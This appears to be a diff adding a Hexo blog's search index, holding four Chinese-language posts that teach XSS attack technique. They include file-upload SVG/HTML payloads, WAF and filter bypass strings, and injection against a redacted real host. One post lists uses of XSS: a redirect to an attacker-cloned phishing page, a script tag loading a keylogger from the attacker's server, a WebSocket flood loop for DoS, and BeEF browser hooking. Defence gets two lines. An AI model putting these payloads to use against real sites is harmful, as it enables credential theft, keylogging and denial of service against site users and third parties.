@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>XSS_2</title>
+      <link href="/2019/12/03/XSS_2/"/>
+      <url>/2019/12/03/XSS_2/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1312925425&auto=0&height=66"></iframe><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><p>1.上传html文件</p><p>&#8195;文件内容为xss的payload</p><p>&#8195;<code>&lt;svg/onload=alert(1)&gt;</code></p><p>&#8195;上传成功后去访问就会触发</p><p>2.上传svg文件</p><p>&#8195;svg文件内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>&#8195;同样只要能访问到就可以触发</p><h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><p>1.一个有在线聊天的网站，发送的聊天内容为xss payload</p><p><img src="/images/xsschat.png" alt="xsschat"></p><p><img src="/images/xsschat2.png" alt="xsschat"></p><p>2.绕过XSS filter</p><p>&#8195;当输入简单的payload:</p><p>&#8195;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>&#8195;发现请求被WAF阻止，经过各种尝试发现，当输入：</p><p>&#8195;<code>o&lt;x&gt;nmouseover=alert&lt;x&gt;1//</code></p><p>&#8195;尖括号与之间的内容被删除，仅剩下<code>onmouseover=alert(1)//</code>并弹出一个xss</p><p>&#8195;这个案例的话就是测试一下waf会对我们输入的内容怎么处理，根据处理方式进行一种利用，进而绕过，当我们遇到一个xss点，一定要多尝试，不要输入俩payload就觉得服务器已经防的死死的，多尝试，多研究，终会绕过的。</p><p>3.错误页面反应的XSS</p><p>&#8195;假设我们现在访问了一段url</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=../../../../etc/passwd</code></p><p>&#8195;出现了以下错误页面</p><p><img src="/images/xssbc.png" alt="xssbc"></p><p>&#8195;我们可以发现，url中file=后面的内容在页面中显示了出来</p><p>&#8195;我们接着尝试插入html标记，测试一下有没有filter</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;h1&gt;asu</code></p><p><img src="/images/xssbc2.png" alt="xssbc"></p><p>&#8195;很显然，并没有filter,我们只需插入xss payload就可以了</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;img src=x onmouseover=alert(1)&gt;</code></p><p><img src="/images/xssbc3.png" alt="xssbc"></p><p>4.url的xss与google dork的故事</p><p>&#8195;假设目标网站是<code>www.example.com</code>，我们使用google <code>site:*.example.com inurl:redirect</code></p><p>&#8195;当我们找到名为<code>example.com/social?redirect=/somewhere</code>时可以尝试<code>Open redirect</code>或XSS</p><p>&#8195;当重定向到白名单url成功后，就可以尝试xss：<code>example.com/social?redirect=javascript://alert(1)</code>,访问后可能会重定向别的地方，按正常用户流程走，可能会触发xss</p><p>&#8195;这个案例就是说我们拿到一个网站后，用google dork一下，发现open redirect 的点后，就在redirect后面添加</p><p>&#8195;简单的javascript urI：<code>javascript://alert(1)</code>去尝试一下。</p><p>5.绕过filter</p><p>&#8195;当网站把<code>&quot;&quot;</code>过滤为<code>&quot;</code>,把<code>&gt;</code>过滤为<code>&amp;gt</code>，我们的payload中就不能使用符号<code>&quot; &lt; &gt;</code></p><p>&#8195;我们就得一点点尝试，然后看<code>response</code>什么样，根据响应结果来修改payload</p><p>&#8195;当payload:时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=&apos;)&#125;hello&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/xssf.png" alt="xssf"></p><p>&#8195;当payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);</span><br></pre></td></tr></table></figure><p><img src="/images/xssf1.png" alt="xssf"></p><p>&#8195;这里没有触发是因为<code>&#39;)</code>未闭合，所有我们再修改一下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a= 1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);(‘</span><br></pre></td></tr></table></figure><p><img src="/images/xssf2.png" alt="xssf"></p><p><img src="/images/xssf3.png" alt="xssf"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是内句话，遇到waf要多尝试，1小时不行就2小时，2小时不行就3小时，不要随便试试就放弃</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> xss </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>脚本收集</title>
+      <link href="/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
+      <url>/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h1 id="此贴不定时更新一些有用的小脚本小工具"><a href="#此贴不定时更新一些有用的小脚本小工具" class="headerlink" title="此贴不定时更新一些有用的小脚本小工具"></a>此贴不定时更新一些有用的小脚本小工具</h1><p><code>https://github.com/gwen001/pentest-tools/blob/master/dnsexpire.py</code> 此脚本可检测域名到期时间，可利用此脚本检测子域名接管。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 脚本 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 脚本 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XSS bypass</title>
+      <link href="/2019/12/02/XSS%20bypass/"/>
+      <url>/2019/12/02/XSS%20bypass/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=27890306&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码</p><p><img src="/images/xssbp.png" alt></p><p>&#8195;2.大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;  ————》 &lt;sCriPt&gt;AlERt(1)&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure><p>&#8195;3.空格回车Tab</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.拆分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.Unicode编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert进行Unicode编码后\u0061\u006c\u0065\u0072\u0074</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;6.不使用括号</p><p>有的时候我们的（）会被过滤掉，那么我们就可以用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;  //这个在chrome里会出现一个uncaught错误，我们可以使用一下payload</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;7.不使用&lt;&gt;</p><p>当输入点在input便签里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;XSStest&quot; type=text&gt;</span><br><span class="line">可以尝试</span><br><span class="line">&quot; autofocus onfocus=alert(1)//</span><br></pre></td></tr></table></figure><p>bypass的方式有很多，我就不一一列举了，可以尝试使用下面的payload去fuzz一下</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> xss </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XSS_1</title>
+      <link href="/2019/11/25/XSS_1/"/>
+      <url>/2019/11/25/XSS_1/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="500" height="86" src="//music.163.com/outchain/player?type=2&id=1300527847&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="/images/xsslc.jpg" alt></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&#8195;反射型</p><p>&#8195;&#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发</p><p>&#8195;存储型</p><p>&#8195;&#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发</p><p>&#8195;DOM型</p><p>&#8195;&#8195;这是一种特殊类型的反射型xss，基于DOM文档对象模型的一种漏洞</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>&#8195;1.盗取cookie</p><p>&#8195;2.网页钓鱼</p><p>&#8195;&#8195;可使用setookit这个工具克隆网站，然后插入payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.location=&quot;http://uip/&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;当用户访问到存在漏洞的页面，就会跳转到你克隆的页面，输入的内容会在服务器上显示</p><p>&#8195;3.键盘记录</p><p>&#8195;&#8195;在咱们自己的服务器网站根目录下创建Keylogger.js文件</p><p><img src="/images/keylogger.png" alt="keylogger"></p><p>&#8195;&#8195;再创建keylogger.php文件，并保存在同一个目录下。</p><p><img src="/images/keyloggerphp.png" alt="keyloggerphp"></p><p>&#8195;&#8195;接着创建一个空的keylog.txt文件，并赋予其相应的可写权限。</p><p>&#8195;&#8195;在存在漏洞的网站插入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://uip/Keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.DOS攻击</p><p>&#8195;如果你发现存储型的xss，并把这段恶意代码插入到目标网站，只要有用户访问到这个点，就会主动去请求连接要攻击的ip地址，站小流量小的话没啥危害，要是内种流量很大的网站，对目标ip会有很大的危害。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript”&gt;</span><br><span class="line"></span><br><span class="line">while (true)&#123; </span><br><span class="line"></span><br><span class="line">var ws = new WebSocket(&quot;ws://要攻击的IP地址:端口”);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.利用beef软件进行攻击</p><p>&#8195;&#8195;首先我们开启beef，第一个标红处的代码需要你把他插入的目标网站，第二段标红处需要你自己访问</p><p><img src="/images/xssbeef.png" alt="xssbeef"></p><p>&#8195;当有人访问了存在xss的页面后，我们的beef就会显示出来</p><p><img src="/images/xssbeef1.png" alt="xssbeef"></p><p>&#8195;这个<code>logs</code>里记录的是用户鼠标键盘的一些操作：</p><p><img src="/images/xssbeef2.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Details</code> 里记录的是对方的操作系统、浏览器版本、cookie等信息</p><p><img src="/images/xssbeef3.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Commands</code>里是可以发送命令给主机，英文看不懂的自行翻译</p><p><img src="/images/xssbeef4.png" alt="xssbeef"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;开启HttpOnly</p><p>&#8195;输入过滤 输出编码</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> xss </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
